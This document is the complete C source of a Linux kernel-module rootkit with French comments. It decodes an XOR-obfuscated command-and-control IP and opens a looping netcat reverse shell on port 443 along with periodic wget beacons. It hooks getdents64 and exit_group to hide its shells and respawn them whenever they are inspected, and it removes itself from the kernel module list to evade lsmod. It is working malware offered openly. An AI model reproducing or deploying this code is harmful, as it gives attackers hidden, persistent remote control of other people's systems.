#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/fdtable.h>   
#include <linux/spinlock.h>  
#define MAX_PATH_BUFFER PATH_MAX

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");
MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill our processes and respawn them");
MODULE_INFO(intree, "Y");

static char host[KSYM_NAME_LEN] = "127.0.0.1";
module_param_string(param, host, KSYM_NAME_LEN, 0644);

/* static struct kprobe kp; */
static struct kprobe kp2;
static struct kprobe kp3;
static char path_buffer[MAX_PATH_BUFFER];
bool killed = false;
static struct workqueue_struct *wq;

// fonction pour déchiffrer l'IP du C2 passé en param 
static void custom_xor(u8 *dst, const u8 *src, u8 key, unsigned int len) {
    unsigned int i;
    for (i = 0; i < len; i++) {
        dst[i] = src[i] ^ key;
    }
}

/* Fonction pour rechercher et kill nos processus */
/* Appellée directement si 'ps' ou 'top', et si un 'ls' ou 'sh' interagit avec /proc */
static void find_and_kill_our_processes(void) {
	/* pr_info("[+] Inside find_and_kill_our_processes\n"); */
    struct task_struct *task;
    for_each_process(task) {
		/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
		/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
        // les sh qui ont pour parent kthreadd
		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
        	/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
			send_sig(SIGKILL, task, 0);
		    killed = true;	
		}
		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
			send_sig(SIGKILL, task, 0);
			killed = true;
		}
		// pour les sleep
		if (strcmp(task->comm, "sleep") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) { 
			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
			send_sig(SIGKILL, task, 0);
			killed = true;
		}
	}
}


/* Fonction pour rechercher dans les fichiers utilisé par la tache en cours si ils sont liés à /proc */ 
/* Appellée si 'ls' ou 'sh' */
static void if_its_related_to_proc_we_kill(void) {
	/* pr_info("[+] Inside if_its_related_to_proc_we_kill\n"); */
	if (current->files) {
		struct fdtable *fdt = files_fdtable(current->files);
		if (fdt) {
			for (int i = 0; i < fdt->max_fds; i++) {
				struct file *file = fdt->fd[i];
				if (file) {
					char *tmp = d_path(&file->f_path, path_buffer, PATH_MAX);
					/* pr_info("[+] Found file: %s\n", tmp); */
					if (tmp) {
						if (strstr(tmp, "/proc") != NULL) {
							/* pr_info("[+] Lets kill our process !\n"); */
							find_and_kill_our_processes();
						}
					}
					path_buffer[0] = '\0';
				}
			}
		}
	}
}


/* Handler pour la fonction hookée (__x64_sys_getdents64) */
static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
	/* pr_info("[+] Hooked __x64_sys_getdents64! PID: %d, name: %s", current->pid, current->comm); */
	if (killed) {
		return 0;
	} 
	if_its_related_to_proc_we_kill();
	return 0;
}

// initiate rev shell
static void rev_shell(void) {
	char *shell;
	int size = strlen("while true; do nc ") + strlen(host) + strlen(" 443 -e sh; sleep 30; done") + 1;
	shell = kmalloc(size, GFP_KERNEL);
	snprintf(shell, size, "while true; do nc %s 443 -e sh; sleep 30; done", host);
	char *argv[] = {"/bin/sh", "-c", shell, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

//function to make a request every 30s
static void make_request_periodic(void) {
	char *str;
	int size = strlen("while true; do wget http://") + strlen(host) + strlen(":123/UP; sleep 30; done") + 1;
	str = kmalloc(size, GFP_KERNEL);
	snprintf(str, size, "while true; do wget http://%s:123/UP; sleep 30; done", host);
	char *argv[] = {"/bin/sh", "-c", str, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}

// function to make requests with a specified string
static void make_request(char *str) {
	char *command;
	int size = strlen("http://") + strlen(host) + strlen(":123/") + strlen(str) + 1;
	command = kmalloc(size, GFP_KERNEL);
	snprintf(command, size, "http://%s:123/%s", host, str);
	char *argv[] = {"/usr/bin/wget", command, NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
	kfree(command);
}

// Structure pour la workqueue

/* Fonction exécutée dans la workqueue */
static void my_work_handler(struct work_struct *work) {
    /* pr_info("[+] Inside my_work_handler\n"); */
    make_request("RESTARTED_BECAUSE_SOMETHING_KILLED_ME");
    rev_shell();
    make_request_periodic();
    kfree(work); // Libérer la mémoire après exécution
}

/* Fonction pour respawn nos processus */
static void respawn_our_processes(void) {

    struct work_struct *work = kmalloc(sizeof(struct work_struct), GFP_ATOMIC);
    if (!work) {
        /* pr_err("[-] Failed to allocate memory for work_struct\n"); */
        return;
    }

	INIT_WORK(work, my_work_handler);
    if (!queue_work(wq, work)) {
        /* pr_err("[-] Failed to queue work\n"); */
        kfree(work);
    }
}


/* Handler pour la fonction hookée (__x64_sys_exit_group) */
static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
	/* pr_info("[+] Hooked __x64_sys_exit_group! PID: %d, name: %s", current->pid, current->comm); */
	if (killed) {
		respawn_our_processes();
		killed = false;
	}
	return 0;
}

// Init function (called when insmod)
static int __init hook_init(void) {
	
	// récupérer l'IP du C2 a partir du param
 	u8 key = 126;
	custom_xor(host, host, key, strlen(host));
	/* pr_info("[+] IP: %s\n", host); */

	// networking start
	make_request("START");
	make_request_periodic();
	rev_shell();
	/* pr_info("[+] Hello from the other side\n"); */

	// probe getdents 
	kp2.symbol_name = "__x64_sys_getdents64";
	kp2.pre_handler = handler_pre2;
	if (register_kprobe(&kp2)) {
		/* pr_err("[-] Failed to register kprobe\n"); */
		return -1;
	}
	/* pr_info("[+] __x64_sys_getdents64 hooked successfully\n"); */

	// workqueue to spawn our process after they are killed
	wq = create_singlethread_workqueue("nfsio");
	if (!wq) {
		/* pr_err("[-] Failed to create workqueue\n"); */
		return -1;
	}

	// probe exit_group
	kp3.symbol_name = "__x64_sys_exit_group";
	kp3.pre_handler = handler_pre3;
	if (register_kprobe(&kp3)) {
		/* pr_err("[-] Failed to register kprobe\n"); */
		return -1;
	}
	/* pr_info("[+] __x64_sys_exit_group hooked successfully\n"); */

	// remove from lsmod and /proc/modules
	list_del(&THIS_MODULE->list); 	
	
	return 0;
}

// Exit function (called when rmmod)
// note that rmmod will not work if the list_del function is uncommented
static void __exit hook_exit(void) {
	make_request("STOP");
    find_and_kill_our_processes();
	unregister_kprobe(&kp2);
	unregister_kprobe(&kp3);
    destroy_workqueue(wq);	
	/* pr_info("[+] Bye bye\n"); */
}

module_init(hook_init);
module_exit(hook_exit);
